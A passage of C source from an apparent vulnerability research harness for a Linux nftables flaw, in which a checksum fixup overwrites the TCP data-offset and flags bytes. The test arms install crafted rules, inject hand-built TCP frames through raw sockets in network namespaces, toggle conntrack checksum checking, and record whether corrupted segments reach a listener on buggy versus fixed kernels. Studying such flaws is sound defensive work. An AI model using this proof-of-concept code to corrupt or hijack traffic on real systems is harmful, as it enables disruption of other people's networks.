		if (((unsigned)buf[14 + 20 + 2] << 8 | buf[14 + 20 + 3]) != F539_PORT)
			continue;
		memcpy(th, buf + 14 + 20, 20);
		(*ncap)++;
	}
	free(f);
	close(s);
	return 0;
}

static int f540_peer_request(struct f539_env *e, int cnt, int *nsent, int *err,
			     int *ncap, unsigned char *th)
{
	char req[32], line[160];

	snprintf(req, sizeof(req), "T %d\n", cnt);
	if (f539_write_all(e->cmd, req, (int)strlen(req)) < 0)
		return -1;
	if (f539_read_line(e->ack, line, sizeof(line), 30000) < 0)
		return -2;
	{
		int rc = -1, i;
		char hex[64];

		memset(hex, 0, sizeof(hex));
		*nsent = *err = *ncap = 0;
		if (sscanf(line + 1, "%d %d %d %d %63s", &rc, nsent, err, ncap, hex) < 4)
			return -3;
		for (i = 0; i < 20 && hex[2 * i] && hex[2 * i + 1]; i++) {
			unsigned int b;

			sscanf(hex + 2 * i, "%2x", &b);
			th[i] = (unsigned char)b;
		}
	}
	return 0;
}

/* ---- one scenario: fresh netns + fresh veth + one rule + one frame ---- */
static int f540_run(int prog, char *out, size_t n)
{
	struct f539_env e;
	static int seq;
	char tab[24];
	unsigned char th[20];
	int errs, nsent = 0, err = 0, ncap = 0, rc;
	char hexth[64];
	int i;

	memset(th, 0, sizeof(th));
	memset(hexth, 0, sizeof(hexth));

	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}

	/* a fresh table name per scenario: the probe lives in the INIT namespace,
	 * so a fixed name would make the second run of the battery fail with EEXIST
	 * before the door was ever reached (measured: errno=17 on every rule) */
	snprintf(tab, sizeof(tab), "t540_%d", seq++);
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	if (op_newchain(tab, "c", NF_INET_FORWARD, 0, NF_ACCEPT) == NULL) {
		f539_env_close(&e);
		snprintf(out, n, "setup=BUILD_FAIL");
		return 0;
	}
	if (prog != C540_NORULE && op_newrule_f540(tab, "c", prog) == NULL) {
		f539_env_close(&e);
		snprintf(out, n, "setup=BUILD_FAIL");
		return 0;
	}
	errs = nf_flush();
	if (errs < 0) {
		f539_env_close(&e);
		snprintf(out, n, "setup=SENDFAIL_%d", errs);
		return 0;
	}
	if (errs > 0) {
		f539_env_close(&e);
		snprintf(out, n, "setup=ERR|errno=%d|extack=%.70s",
			 g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		return 0;
	}

	rc = f540_peer_request(&e, 1, &nsent, &err, &ncap, th);
	/* take the rule back out before the next scenario: see op_deltable_f540 */
	nops = 0;
	nrecs = 0;
	op_deltable_f540(tab);
	nf_flush();
	f539_env_close(&e);
	if (rc != 0) {
		snprintf(out, n, "setup=OK|peer=FAIL_%d", -rc);
		return 0;
	}
	for (i = 0; i < 20; i++)
		snprintf(hexth + 2 * i, 3, "%02x", th[i]);
	snprintf(out, n,
		 "setup=OK|sent=%d|cap=%d|doff=%02x|ack=%02x%02x%02x%02x|th=%s",
		 nsent, ncap, th[12], th[8], th[9], th[10], th[11], hexth);
	return 0;
}

static int sc_f540_norule(char *o, size_t n)     { return f540_run(C540_NORULE, o, n); }
static int sc_f540_legal(char *o, size_t n)      { return f540_run(C540_LEGAL, o, n); }
static int sc_f540_hijack_doff(char *o, size_t n){ return f540_run(C540_HIJACK_DOFF, o, n); }
static int sc_f540_hijack_ack(char *o, size_t n) { return f540_run(C540_HIJACK_ACK, o, n); }
static int sc_f540_store_doff(char *o, size_t n) { return f540_run(C540_STORE_DOFF, o, n); }
static int sc_f540_nh_ihl(char *o, size_t n)     { return f540_run(C540_NH_IHL, o, n); }
static int sc_f540_hijack_proto6(char *o, size_t n){ return f540_run(C540_HIJACK_PROTO6, o, n); }
static int sc_f540_hijack_inner(char *o, size_t n) { return f540_run(C540_HIJACK_INNER, o, n); }

static int f540_diag(char *out, size_t n)
{
	unsigned long long inrecv = 0, forw = 0;
	int rc = f539_snmp(&inrecv, &forw);

	(void)rc;
	snprintf(out, n, "setup=OK|in=%llu|forw=%llu", inrecv, forw);
	return 0;
}

static void run_f540(void)
{
	static struct { const char *id; int (*fn)(char *, size_t); } tab[] = {
		{ "csum.ctl.norule",    sc_f540_norule },
		{ "csum.ctl.legal",     sc_f540_legal },
		{ "csum.hijack.doff",   sc_f540_hijack_doff },
		{ "csum.hijack.ack",    sc_f540_hijack_ack },
		{ "csum.ctl.store_doff", sc_f540_store_doff },
		{ "csum.ctl.nh_ihl",    sc_f540_nh_ihl },
		{ "csum.hijack.proto6", sc_f540_hijack_proto6 },
		{ "csum.hijack.inner",  sc_f540_hijack_inner },
		{ "csum.diag",          f540_diag },
	};
	unsigned int i;

	for (i = 0; i < sizeof(tab) / sizeof(tab[0]); i++) {
		char out[512];
		char id[128];
		int k;

		memset(out, 0, sizeof(out));
		snprintf(id, sizeof(id), "%s", tab[i].id);
		for (k = 0; id[k]; k++)
			if (id[k] == ' ')
				id[k] = '_';
		tab[i].fn(out, sizeof(out));
		printf("S %s|%s\n", id, out);
		fflush(stdout);
	}
}

#ifndef NFT_REG32_01
#define NFT_REG32_01 9		/* second 4-byte slice of NFT_REG_1 */
#endif

/* ==========================================================================
 * differ541_add.c -- turn 541 (F18): THE CONSEQUENCE.
 *
 * F17 measured the door: on the code v7.3 shipped, a rule whose store is at
 * transport+20 with csum_offset 12 makes the *checksum fixup* write two bytes
 * over tcp->doff -- the exact bytes nft_th_write_ok() (112e447d17f7) refuses to
 * let a store touch.  F17 stopped at the bytes on the wire.  This battery asks
 * the two questions F17 left open:
 *
 *   1. can that corruption reach a real socket / crash a real release kernel?
 *   2. what is the *consequence* of the two bytes, exactly?
 *
 * The instrument is the same netns pair, but the frame is now fully built
 * (doff, flags, payload, checksum all chosen), the whole IPv4 datagram comes
 * back as hex, and one arm delivers it to a listening TCP socket on the near
 * side so that "delivered / not delivered" is a socket event, not a byte.
 *
 *   f541.fwd.norule    no rule, doff 0x50, good csum   -> wire bytes == sent bytes
 *   f541.fwd.legal     store @20 csum_offset 16        -> doff 0x50, csum stays good
 *   f541.fwd.door      store @20 csum_offset 12        -> doff 0x22, csum ???
 *   f541.fwd.repair    door + a second store @20 csum_offset 16 (an attempt to
 *                      put the checksum right again)
 *   f541.fwd.byhand    no rule; the frame is BUILT with doff 0x22 and a correct
 *                      checksum: proves "corrupt + valid" is representable and
 *                      that the checker can see it
 *   f541.fwd.badcsum   no rule; one bit of the checksum flipped: control that
 *                      the checker is sensitive
 *
 *   f541.in.norule       SYN, doff 0x50, good csum   -> listening socket answers
 *   f541.in.legal        same with the legal rule    -> still answers
 *   f541.in.door         the door rule               -> no answer
 *   f541.in.door.nocsum  the door rule, with the *receiver's* conntrack checksum
 *                        validation disabled: if the packet is then dropped by
 *                        TCP itself, InCsumErrors moves
 *   f541.in.byhand       no rule; SYN built with doff 0x22 and a correct checksum
 *                        -> a real listener answers a segment whose header
 *                        claims 136 bytes: the corruption alone is not fatal,
 *                        the checksum is
 *   f541.in.opts         same, but the 116 "option" bytes are a real option
 *                        block (MSS, window scale, timestamp, SACK-permitted):
 *                        the most parser work a corrupted doff can buy
 *
 * Every arm is measured on R = linux-7.3 built from the release tarball (the
 * code that shipped) and on B = linux-7.3.4 as released (fixed).
 */

#ifndef F541_DUMP
#define F541_DUMP 64		/* bytes of the IPv4 datagram returned as hex   */
#endif
#define F541_RULE_NONE          0
#define F541_RULE_LEGAL         1
#define F541_RULE_DOOR12        2
#define F541_RULE_DOOR12_REPAIR 3
#define F541_RULE_DOOR6         4
#define F541_RULE_DOOR6_REPAIR  5
#define F541_RULE_DOOR15        6

/* one's-complement sum, unfolded seed, folded result (no final complement) */
static unsigned int f541_csum16(const void *data, int len, unsigned int seed)
{
	const unsigned char *p = data;
	unsigned int sum = seed;

	while (len > 1) {
		sum += (unsigned int)((p[0] << 8) | p[1]);
		p += 2;
		len -= 2;
	}
	if (len)
		sum += (unsigned int)(p[0] << 8);
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return sum;
}

/* A SYN's option area, as 116 bytes of TCP options: MSS 1460, window scale 7,
 * timestamp, SACK permitted, then NOP padding.  Used by f541.in.opts so the
 * receiver's tcp_parse_options() does real work on bytes a corrupted doff put
 * inside the header. */
static void f541_optfill(unsigned char *pay, int plen)
{
	static const unsigned char opt[] = {
		0x02, 0x04, 0x05, 0xb4,			/* MSS 1460        */
		0x03, 0x03, 0x07,			/* window scale 7  */
		0x08, 0x0a, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
		0x04, 0x02,				/* SACK permitted  */
		0x01, 0x01, 0x01, 0x01,
	};
	int i;

	for (i = 0; i < plen; i++)
		pay[i] = (i < (int)sizeof(opt)) ? opt[i] : 0x01;
}

/* The peer: build ONE Ethernet+IPv4+TCP frame from the parameters, inject it
 * on fv1, then watch the wire for (a) the forwarded datagram coming back out
 * of fv0 and (b) any frame whose SOURCE port is 9999, i.e. an answer from the
 * near side's listener.  The first forwarded datagram is returned verbatim so
 * the checksum can be recomputed outside the kernel by the parser. */
static int f541_peer_tcp2(int cnt, int plen, uint32_t dst, int doff, int flags,
			  int csummode, int optset, int want_fwd, int want_reply,
			  int *nsent, int *err, int *ncap, int *nreply,
			  int *rflags, unsigned char *fr)
{
	struct sockaddr_ll sll;
	struct pollfd pfd;
	unsigned char *f, buf[2048];
	int s, i, k, idx = f539_ifindex("fv1");
	int flen = 14 + 20 + 20 + plen;

	*nsent = 0;
	*err = 0;
	*ncap = 0;
	*nreply = 0;
	*rflags = 0;
	memset(fr, 0, F541_DUMP);
	if (idx < 0 || plen < 0 || plen > 1000)
		return 41;
	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0)
		return 42;
	f = calloc(1, (size_t)flen);
	if (!f) {
		close(s);
		return 43;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = idx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, f539_mac_me, 6);
	while (recv(s, buf, sizeof(buf), MSG_DONTWAIT) > 0)
		;

	for (i = 0; i < cnt; i++) {
		uint32_t saddr = htonl(F539_ADDR_PEER), daddr = htonl(dst);
		unsigned char *ip = f + 14;
		unsigned char *tcp = ip + 20;
		unsigned char *pay = tcp + 20;
		unsigned char pseudo[12];
		unsigned int sum;
		ssize_t w;

		memcpy(f, f539_mac_me, 6);
		memcpy(f + 6, f539_mac_far, 6);
		f[12] = 0x08;
		f[13] = 0x00;
		memset(ip, 0, 20);
		ip[0] = 0x45;
		ip[2] = (unsigned char)((20 + 20 + plen) >> 8);
		ip[3] = (unsigned char)((20 + 20 + plen) & 0xff);
		ip[5] = (unsigned char)(0x50 + i);
		ip[8] = 64;
		ip[9] = IPPROTO_TCP;
		memcpy(ip + 12, &saddr, 4);
		memcpy(ip + 16, &daddr, 4);
		*(unsigned short *)(ip + 10) = htons(f539_csum(ip, 20));

		memset(tcp, 0, 20);
		tcp[0] = 0x9c;				/* sport 40000            */
		tcp[1] = 0x40;
		tcp[2] = (unsigned char)(F539_PORT >> 8);
		tcp[3] = (unsigned char)(F539_PORT & 0xff);
		tcp[4] = 0x11;				/* seq 0x11223344         */
		tcp[5] = 0x22;
		tcp[6] = 0x33;
		tcp[7] = 0x44;
		tcp[12] = (unsigned char)doff;		/* the byte the door owns  */
		tcp[13] = (unsigned char)flags;
		tcp[14] = 0xff;
		tcp[15] = 0xff;				/* window                 */
		for (k = 0; k < plen; k++)
			pay[k] = 0x77;
		if (optset)
			f541_optfill(pay, plen);

		memcpy(pseudo, ip + 12, 8);
		pseudo[8] = 0;
		pseudo[9] = IPPROTO_TCP;
		pseudo[10] = (unsigned char)((20 + plen) >> 8);
		pseudo[11] = (unsigned char)((20 + plen) & 0xff);
		sum = f541_csum16(pseudo, 12, 0);
		sum = f541_csum16(tcp, 20 + plen, sum);
		*(unsigned short *)(tcp + 16) = htons((unsigned short)(~sum & 0xffff));
		if (csummode == 1)
			tcp[17] ^= 0x01;		/* one bit wrong, on purpose */

		w = sendto(s, f, (size_t)flen, 0, (struct sockaddr *)&sll, sizeof(sll));
		if (w < 0) {
			if (!*err)
				*err = errno;
		} else {
			(*nsent)++;
		}
	}

	pfd.fd = s;
	pfd.events = POLLIN;
	for (i = 0; i < 40; i++) {
		struct sockaddr_ll from;
		socklen_t fl = sizeof(from);
		ssize_t r;

		if ((!want_fwd || *ncap > 0) && (!want_reply || *nreply > 0) && i >= 5)
			break;
		if (poll(&pfd, 1, 100) <= 0)
			continue;
		r = recvfrom(s, buf, sizeof(buf), MSG_DONTWAIT,
			     (struct sockaddr *)&from, &fl);
		if (r < 40)
			continue;
		if (from.sll_pkttype == PACKET_OUTGOING)
			continue;
		if (buf[12] != 0x08 || buf[13] != 0x00)
			continue;
		if (buf[14 + 9] != IPPROTO_TCP)
			continue;
		{
			unsigned int sport = ((unsigned int)buf[14 + 20] << 8) |
					     buf[14 + 20 + 1];
			unsigned int dport = ((unsigned int)buf[14 + 20 + 2] << 8) |
					     buf[14 + 20 + 3];

			if (sport == F539_PORT) {
				(*nreply)++;
				if (*nreply == 1)
					*rflags = buf[14 + 20 + 13];
			} else if (want_fwd && dport == F539_PORT) {
				int nb = (int)r - 14;

				if (nb > F541_DUMP)
					nb = F541_DUMP;
				if (*ncap == 0 && nb > 0)
					memcpy(fr, buf + 14, (size_t)nb);
				(*ncap)++;
			}
		}
	}
	free(f);
	close(s);
	return 0;
}

/* Tcp: InSegs(10) InErrs(13) InCsumErrors(15) from the "Tcp:" line of /proc/net/snmp */
static int f541_tcp_snmp(unsigned long long *inseg, unsigned long long *inerr,
			 unsigned long long *incsum)
{
	FILE *fp = fopen("/proc/net/snmp", "r");
	char buf[1024];
	int hdr = 0;

	*inseg = 0;
	*inerr = 0;
	*incsum = 0;
	if (!fp)
		return -1;
	while (fgets(buf, sizeof(buf), fp)) {
		if (!strncmp(buf, "Tcp:", 4)) {
			if (!hdr) {
				hdr = 1;
				continue;
			}
			{
				char *p = buf + 4;
				unsigned long long v = 0;
				int i;

				for (i = 0; i < 15; i++) {
					while (*p == ' ')
						p++;
					v = strtoull(p, &p, 10);
					if (i == 9)
						*inseg = v;
					else if (i == 12)
						*inerr = v;
				}
				*incsum = v;
			}
			break;
		}
	}
	fclose(fp);
	return 0;
}

/* sum of the "invalid" column of /proc/net/stat/nf_conntrack */
static int f541_ct_invalid(unsigned long long *invalid)
{
	FILE *fp = fopen("/proc/net/stat/nf_conntrack", "r");
	char buf[2048];
	int col = -1, n = 0;

	*invalid = 0;
	if (!fp)
		return -1;
	while (fgets(buf, sizeof(buf), fp)) {
		char *p = buf;

		if (col < 0) {
			int idx = 0;

			while (*p) {
				char *tok = p;

				while (*p && *p != ' ')
					p++;
				if (*p)
					*p++ = 0;
				if (!strcmp(tok, "invalid")) {
					col = idx;
					break;
				}
				idx++;
				while (*p == ' ')
					p++;
			}
			if (col < 0)
				break;
			continue;
		}
		{
			int idx = 0;
			unsigned long long v = 0;

			while (*p && idx <= col) {
				while (*p == ' ')
					p++;
				v = strtoull(p, &p, 16);
				idx++;
			}
			if (idx > col)
				*invalid += v;
			n++;
		}
	}
	fclose(fp);
	return n > 0 ? 0 : -2;
}

/* store values.  The two bytes the fixup writes at 12..13 are
 *     V = old_word12 + (csum(store) - csum(original payload word))
 * so the store value CHOOSES the corrupted header:
 *   0d 0e 0f 10  ->  V = 0x22d3  (doff 2, URG|ACK|FIN)   [measured on v7.3]
 *   de ee 00 00  ->  V = 0x6002  (doff 6, SYN)            [a LEGAL tcp header]
 *   4e ee 00 00  ->  V = 0xf002  (doff 15, SYN)           [the largest header]
 * The sign was measured, not derived: the fixup writes old - (payload delta), so
 * the packet's own checksum stays consistent (see SUMMARY section 2).
 */
static const unsigned char f541_v_7d31[4] = { 0x0d, 0x0e, 0x0f, 0x10 };
static const unsigned char f541_v_6002[4] = { 0xde, 0xee, 0x00, 0x00 };
static const unsigned char f541_v_f002[4] = { 0x4e, 0xee, 0x00, 0x00 };
static const unsigned char f541_v_repair[4] = { 0x21, 0x22, 0x23, 0x24 };

static struct nlmsghdr *op_newrule_f541(const char *table, const char *chain,
					int rule)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "f541.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "f541.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "f541.rule.exprs");

	switch (rule) {
	case F541_RULE_LEGAL:
		exfil_imm_value(nlh, NFT_REG32_00, f541_v_7d31, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 16);
		break;
	case F541_RULE_DOOR12:
		exfil_imm_value(nlh, NFT_REG32_00, f541_v_7d31, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 12);
		break;
	case F541_RULE_DOOR12_REPAIR:
		exfil_imm_value(nlh, NFT_REG32_00, f541_v_7d31, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 12);
		exfil_imm_value(nlh, NFT_REG32_01, f541_v_repair, 4);
		c540_payload_set(nlh, NFT_REG32_01, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 16);
		break;
	case F541_RULE_DOOR6:
		exfil_imm_value(nlh, NFT_REG32_00, f541_v_6002, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 12);
		break;
	case F541_RULE_DOOR15:
		exfil_imm_value(nlh, NFT_REG32_00, f541_v_f002, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 12);
		break;
	case F541_RULE_DOOR6_REPAIR:
		exfil_imm_value(nlh, NFT_REG32_00, f541_v_6002, 4);
		c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 12);
		exfil_imm_value(nlh, NFT_REG32_01, f541_v_repair, 4);
		c540_payload_set(nlh, NFT_REG32_01, NFT_PAYLOAD_TRANSPORT_HEADER,
				 20, 4, NFT_PAYLOAD_CSUM_INET, 16);
		break;
	default:
		break;
	}
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

static int f541_run(int hook, int rule, int plen, int doff, int flags,
		    int csummode, int optset, int ct_csum, char *out, size_t n)
{
	struct f539_env e;
	char tab[24];
	char line[512];
	char hex[2 * F541_DUMP + 1];
	unsigned char fr[F541_DUMP];
	int lfd = -1, errs, rc, i;
	int nsent = 0, err = 0, ncap = 0, nreply = 0, rflags = 0;
	unsigned long long cs0 = 0, cs1 = 0, iv0 = 0, iv1 = 0;
	unsigned long long is0 = 0, is1 = 0, ie0 = 0, ie1 = 0;
	uint32_t dst = (hook == NF_INET_LOCAL_IN) ? F539_ADDR_ME : F539_ADDR_DST;
	int want_fwd = (hook == NF_INET_FORWARD) ? 1 : 0;
	int want_reply = (hook == NF_INET_LOCAL_IN) ? 1 : 0;

	memset(fr, 0, sizeof(fr));
	memset(hex, 0, sizeof(hex));
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	if (want_reply) {
		struct sockaddr_in sa;

		lfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
		if (lfd >= 0) {
			int one = 1;

			memset(&sa, 0, sizeof(sa));
			sa.sin_family = AF_INET;
			sa.sin_port = htons(F539_PORT);
			sa.sin_addr.s_addr = htonl(F539_ADDR_ME);
			setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
			if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0 ||
			    listen(lfd, 8) < 0) {
				close(lfd);
				lfd = -1;
			}
		}
		if (lfd < 0) {
			f539_env_close(&e);
			snprintf(out, n, "setup=LISTEN_FAIL");
			return 0;
		}
	}
	if (!ct_csum)
		f539_sysctl("/proc/sys/net/netfilter/nf_conntrack_checksum", "0");

	snprintf(tab, sizeof(tab), "t541_%d_%d_%d", (int)getpid(), hook, rule);
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	if (op_newchain(tab, "c", hook, 0, NF_ACCEPT) == NULL) {
		if (lfd >= 0)
			close(lfd);
		f539_env_close(&e);
		snprintf(out, n, "setup=BUILD_FAIL");
		return 0;
	}
	if (rule != F541_RULE_NONE && op_newrule_f541(tab, "c", rule) == NULL) {
		if (lfd >= 0)
			close(lfd);
		f539_env_close(&e);
		snprintf(out, n, "setup=BUILD_FAIL");
		return 0;
	}
	errs = nf_flush();
	if (errs < 0) {
		if (lfd >= 0)
			close(lfd);
		f539_env_close(&e);
		snprintf(out, n, "setup=SENDFAIL_%d", errs);
		return 0;
	}
	if (errs > 0) {
		if (lfd >= 0)
			close(lfd);
		f539_env_close(&e);
		snprintf(out, n, "setup=ERR|errno=%d|extack=%.70s",
			 g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		return 0;
	}

	f541_tcp_snmp(&is0, &ie0, &cs0);
	f541_ct_invalid(&iv0);
	{
		char req[96];

		snprintf(req, sizeof(req), "Y %d %d %u %d %d %d %d %d %d\n",
			 1, plen, dst, doff, flags, csummode, optset,
			 want_fwd, want_reply);
		if (f539_write_all(e.cmd, req, (int)strlen(req)) < 0) {
			rc = -1;
		} else if (f539_read_line(e.ack, line, sizeof(line), 30000) < 0) {
			rc = -2;
		} else {
			char hx[2 * F541_DUMP + 1];

			memset(hx, 0, sizeof(hx));
			rc = -3;
			if (sscanf(line + 1, "%d %d %d %d %d %d %128s", &rc, &nsent,
				   &err, &ncap, &nreply, &rflags, hx) >= 6) {
				memcpy(hex, hx, sizeof(hex) - 1);
				for (i = 0; i < F541_DUMP; i++) {
					unsigned int b;

					if (!hex[2 * i] || !hex[2 * i + 1])
						break;
					sscanf(hex + 2 * i, "%2x", &b);
					fr[i] = (unsigned char)b;
				}
			}
		}
		(void)rc;
	}
	f541_tcp_snmp(&is1, &ie1, &cs1);
	f541_ct_invalid(&iv1);

	nops = 0;
	nrecs = 0;
	op_deltable_f540(tab);
	nf_flush();
	if (lfd >= 0)
		close(lfd);
	f539_env_close(&e);

	{
		int off = 0;

		off += snprintf(out + off, n - (size_t)off,
				"setup=OK|sent=%d|cap=%d|nrep=%d|rflags=%02x|inseg=%llu|inerr=%llu|cserr=%llu|ctinv=%llu|ip=",
				nsent, ncap, nreply, rflags,
				is1 - is0, ie1 - ie0, cs1 - cs0, iv1 - iv0);
		for (i = 0; i < F541_DUMP && (size_t)off + 2 < n; i++)
			off += snprintf(out + off, n - (size_t)off, "%02x", fr[i]);
	}
	return 0;
}

static int sc_f541_fwd_norule(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_NONE, 16, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_fwd_legal(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_LEGAL, 16, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_fwd_door12(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_DOOR12, 16, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_fwd_door12_repair(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_DOOR12_REPAIR, 16, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_fwd_door6(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_DOOR6, 16, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_fwd_door15(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_DOOR15, 16, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_fwd_byhand6(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_NONE, 16, 0x60, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_fwd_byhandF(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_NONE, 16, 0xf0, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_fwd_badcsum(char *o, size_t n)
{
	return f541_run(NF_INET_FORWARD, F541_RULE_NONE, 16, 0x50, 0x02, 1, 0, 1, o, n);
}

static int sc_f541_in_norule(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_NONE, 116, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_in_legal(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_LEGAL, 116, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_in_door6(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_DOOR6, 116, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_in_door12(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_DOOR12, 116, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_in_door15(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_DOOR15, 116, 0x50, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_in_door15_opts(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_DOOR15, 116, 0x50, 0x02, 0, 1, 1, o, n);
}

static int sc_f541_in_dup6(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_NONE, 116, 0x60, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_in_dup22(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_NONE, 116, 0x22, 0x02, 0, 0, 1, o, n);
}

/* --- diagnostics: the raw /proc/net/snmp Tcp line, and two boundary arms --- */
static int sc_f541_snmp(char *o, size_t n)
{
	FILE *fp = fopen("/proc/net/snmp", "r");
	char buf[1024], hdr[768] = "", val[768] = "";

	if (!fp) {
		snprintf(o, n, "setup=NO_PROC");
		return 0;
	}
	while (fgets(buf, sizeof(buf), fp)) {
		char *nl;

		if (strncmp(buf, "Tcp:", 4))
			continue;
		nl = strchr(buf, '\n');
		if (nl)
			*nl = 0;
		if (!hdr[0])
			snprintf(hdr, sizeof(hdr), "%s", buf + 5);
		else
			snprintf(val, sizeof(val), "%s", buf + 5);
		if (val[0])
			break;
	}
	fclose(fp);
	if (!val[0]) {
		snprintf(o, n, "setup=NO_TCP_LINE");
		return 0;
	}
	snprintf(o, n, "setup=OK|hdr=%s|val=%s", hdr, val);
	return 0;
}

static int sc_f541_in_byhand_big(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_NONE, 200, 0x22, 0x02, 0, 0, 1, o, n);
}

static int sc_f541_in_doff6(char *o, size_t n)
{
	return f541_run(NF_INET_LOCAL_IN, F541_RULE_NONE, 16, 0x60, 0x02, 0, 0, 1, o, n);
}

static void run_f541_in(void)
{
	static struct { const char *id; int (*fn)(char *, size_t); } tab[] = {
		{ "f541.in.norule", sc_f541_in_norule },
		{ "f541.in.legal", sc_f541_in_legal },
		{ "f541.in.door6", sc_f541_in_door6 },
		{ "f541.in.door12", sc_f541_in_door12 },
		{ "f541.in.door15", sc_f541_in_door15 },
		{ "f541.in.door15.opts", sc_f541_in_door15_opts },
		{ "f541.in.dup6", sc_f541_in_dup6 },
		{ "f541.in.dup22", sc_f541_in_dup22 },
		{ "f541.snmp", sc_f541_snmp },
	};
	unsigned int i;

	for (i = 0; i < sizeof(tab) / sizeof(tab[0]); i++) {
		char out[512];
		char id[128];
		int k;

		memset(out, 0, sizeof(out));
		snprintf(id, sizeof(id), "%s", tab[i].id);
		for (k = 0; id[k]; k++)
			if (id[k] == ' ')
				id[k] = '_';
		tab[i].fn(out, sizeof(out));
		printf("S %s|%s\n", id, out);
		fflush(stdout);
	}
}

static void run_f541(void)
{
	static struct { const char *id; int (*fn)(char *, size_t); } tab[] = {
		{ "f541.fwd.norule", sc_f541_fwd_norule },
		{ "f541.fwd.legal", sc_f541_fwd_legal },
		{ "f541.fwd.door12", sc_f541_fwd_door12 },
		{ "f541.fwd.door12.repair", sc_f541_fwd_door12_repair },
		{ "f541.fwd.door6", sc_f541_fwd_door6 },
		{ "f541.fwd.door15", sc_f541_fwd_door15 },
		{ "f541.fwd.byhand6", sc_f541_fwd_byhand6 },
		{ "f541.fwd.byhandF", sc_f541_fwd_byhandF },
		{ "f541.fwd.badcsum", sc_f541_fwd_badcsum },
		{ "f541.in.norule", sc_f541_in_norule },
		{ "f541.in.legal", sc_f541_in_legal },
		{ "f541.in.door6", sc_f541_in_door6 },
		{ "f541.in.door12", sc_f541_in_door12 },
		{ "f541.in.door15", sc_f541_in_door15 },
		{ "f541.in.door15.opts", sc_f541_in_door15_opts },
		{ "f541.in.dup6", sc_f541_in_dup6 },
		{ "f541.in.dup22", sc_f541_in_dup22 },
		{ "f541.snmp", sc_f541_snmp },
	};
	unsigned int i;

	for (i = 0; i < sizeof(tab) / sizeof(tab[0]); i++) {
		char out[512];
		char id[128];
		int k;

		memset(out, 0, sizeof(out));
